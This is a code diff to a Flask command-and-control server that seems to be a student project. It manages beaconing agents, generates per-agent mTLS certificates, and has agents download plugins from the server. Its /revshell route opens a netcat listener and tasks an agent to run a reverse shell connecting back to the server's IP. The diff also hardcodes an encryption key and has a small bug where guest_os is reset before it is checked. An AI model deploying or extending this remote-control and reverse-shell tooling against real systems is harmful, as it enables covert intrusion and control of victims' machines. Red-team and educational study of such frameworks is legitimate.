@@ -3,7 +3,7 @@ import json
 import subprocess
 import uuid
 import bcrypt
-from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
+from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory, abort
 from werkzeug.utils import secure_filename
 from cryptography.fernet import Fernet
 from dotenv import load_dotenv
@@ -12,6 +12,7 @@ import sqlite3
 from flask import g
 import secrets
 from functools import wraps
+import functools
 import logging
 import sys
 import threading
@@ -22,6 +23,7 @@ from collections import Counter
 import string
 import difflib
 from google import genai
+from pathlib import Path
 from bcrypt import hashpw, gensalt, checkpw
 
 app = Flask(__name__)
@@ -60,7 +62,7 @@ werk_log.propagate = False
 
 # --- Configuration ---
 
-IP = "192.168.1.41"
+IP = "127.0.0.1"
 PORT = 5000
 API_KEY = os.getenv("API_KEY")
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
@@ -114,7 +116,7 @@ Provide clear situational awareness and actionable intelligence without performi
 """
 
 #Folders & Directories
-
+BASE_DIR = Path.cwd()
 DATABASE = "c2.db"
 UPLOAD_FOLDER = "./upload"
 PLUGINS_DIR = "./plugins"
@@ -123,6 +125,43 @@ os.makedirs(PLUGINS_DIR, exist_ok=True)
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['TOOLS_FOLDER'] = TOOLS_FOLDER
+CERT_DIR = Path("./keys")
+
+def require_mtls(f):
+    """
+    Decorator: require mTLS authentication
+
+    This decorator checks that Nginx has verified the client certificate.
+    Nginx sets X-SSL-Verified and X-Client-Cert-CN headers after successful
+    TLS handshake.
+    """
+
+    @functools.wraps(f)
+    def wrapper(*args, **kwargs):
+        # Check if Nginx verified the certificate
+        verified = request.headers.get("X-SSL-Verified")
+        agent_cert = request.headers.get("X-Client-Cert-CN")
+
+        # Log the request
+
+
+        # Reject if not verified
+        if verified != "SUCCESS":
+            abort(403, "Client certificate verification failed")
+
+        # Reject if no identity
+        if not agent_cert:
+            abort(403, "No client certificate identity")
+
+        # Attach to request context for use in route handlers
+        request.agent_cert = agent_cert
+        request.agent_dn = request.headers.get("X-Client-Cert-DN")
+        request.agent_fingerprint = request.headers.get("X-Client-Fingerprint")
+
+        return f(*args, **kwargs)
+
+    return wrapper
+
 
 # --- Encryption functions ---
 def encrypt_data(data):
@@ -191,6 +230,7 @@ def require_token(role=None):  #  accepts role
     return wrapper
 
 # --- Agent beacon endpoint ---
+@require_mtls
 @app.route('/beacon', methods=['POST'])
 def beacon():
     encrypted = request.json.get('data')
@@ -342,13 +382,13 @@ def agent_create():
         (username, hashed, "agent")
     )
     db.commit()
-    with open("Agent2.py", "r") as f_in, open(f"Agent{id_number}.py", "w") as f_out:
+    with open("Agent.py", "r") as f_in, open(f"Agent{id_number}.py", "w") as f_out:
         lines = f_in.readlines()
 
-        lines[22] = f'username = "{username}"\n'
-        lines[23] = f'password = "{password}"\n'
-        lines[28] = f'AGENT_ID = "{id_number}"\n'
-        lines[29] = f'AGENT_GROUP = "{agent_group}"\n'
+        lines[24] = f'username = "{username}"\n'
+        lines[25] = f'password = "{password}"\n'
+        lines[30] = f'AGENT_ID = "{id_number}"\n'
+        lines[31] = f'AGENT_GROUP = "{agent_group}"\n'
 
         f_out.writelines(lines)
 
@@ -360,6 +400,42 @@ def agent_create():
         "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?,?)",
         (log_uuid, current_time, "administrator",f"Created a new agent: {id_number}", "Info",task_uuid))
     db.commit()
+
+    key = CERT_DIR / f"agent{id_number}.key"
+    csr = CERT_DIR / f"agent{id_number}.csr"
+    crt = CERT_DIR / f"agent{id_number}.crt"
+
+    # 1. Generate private key
+    subprocess.run([
+    "openssl", "genpkey",
+    "-algorithm", "RSA",
+    "-pkeyopt", "rsa_keygen_bits:2048",
+    "-out", str(key)
+    ], check=True)
+
+# 2. Create CSR with SAN (required for modern TLS)
+    subprocess.run([
+        "openssl", "req",
+        "-new",
+        "-key", str(key),
+        "-out", str(csr),
+        "-subj", f"/C=US/ST=CA/O=TENET/CN={id_number}",
+        "-addext", f"subjectAltName=DNS:{id_number}"
+    ], check=True)
+
+    # 3. Sign certificate with CA (use SHA-256)
+    subprocess.run([
+        "openssl", "x509",
+        "-req",
+        "-in", str(csr),
+        "-CA", str(CERT_DIR / "ca.crt"),
+        "-CAkey", str(CERT_DIR / "ca.key"),
+        "-CAcreateserial",
+        "-out", str(crt),
+        "-days", "365",
+        "-sha256"
+    ], check=True)
+
     return ({"status":"created"}) ,200
 
 # --- Agent result endpoint ---
@@ -597,7 +673,7 @@ def run_plugin():
 
     # Construct the plugin URL that agent will download
     #plugin_url = f"{request.host_url}plugins/{plugin_name}"
-    plugin_url = "http://{IP}:{PORT}/plugins/{plugin_name}".format(IP=IP,PORT=PORT,plugin_name=plugin_name)
+    plugin_url = "https://{IP}/plugins/{plugin_name}".format(IP=IP,plugin_name=plugin_name)
     # Insert task into tasks table
     task_uuid = str(uuid.uuid4())
     db = get_db()
@@ -1315,9 +1391,11 @@ def tools_file(filename):
 @app.route('/revshell',methods=['POST'])
 def revshell():
     #Gets request from browser
-    netcat_url = f"http://{IP}:{PORT}/tools/Netcat.py"
+    netcat_url = f"https://{IP}/tools/Netcat.py"
     agent_id = request.json.get("agent_id")
     port = request.json.get("port")
+    host_os = request.json.get("host_os")
+    agent_os = request.json.get("agent_os")
     task_uuid = str(uuid.uuid4())
     current_time = datetime.now(timezone.utc)
     if port and agent_id:
@@ -1329,12 +1407,23 @@ def revshell():
         db.commit()
     else:
         return jsonify({"Error": "Missing Parameters"}), 401
-    rev_dir = r"C:\Users\USER\PycharmProjects\Grad\tools\Netcat.py"
-    rev_cmd = f'py "{rev_dir}" -l -p {port}'
-
+    rev_dir = rev_dir = BASE_DIR / "tools" / "Netcat.py"
+    rev_cmd_win = f'py "{rev_dir}" -l -p {port}'
+    rev_cmd_lin = f'python3 "{rev_dir}" -l -p {port}'
+    host_cmd = ""
+    guest_cmd = ""
+    if (host_os=="windows"):
+        host_cmd = f'start cmd /k "{rev_cmd_win}"'
+    else:
+        host_cmd = f'qterminal -e "{rev_cmd_lin}"'
+    guest_os = ""
+    if (guest_os=="windows"):
+        guest_cmd = f"py Netcat.py -t {IP} -p {port}"
+    else:
+        guest_cmd = f"python3 Netcat.py -t {IP} -p {port}"
     # Use start cmd to open new terminal window
     subprocess.Popen(
-        f'start cmd /k "{rev_cmd}"',
+        host_cmd,
         shell=True
     )
     time.sleep(3)
@@ -1344,7 +1433,7 @@ def revshell():
     db.execute("""
         INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
         VALUES (?, ?, ?, NULL, ?, NULL)
-    """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": f"python3 Netcat.py -t {IP} -p {port}"}),current_time))
+    """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": guest_cmd}),current_time))
     db.commit()
 
     log_uuid = str(uuid.uuid4())
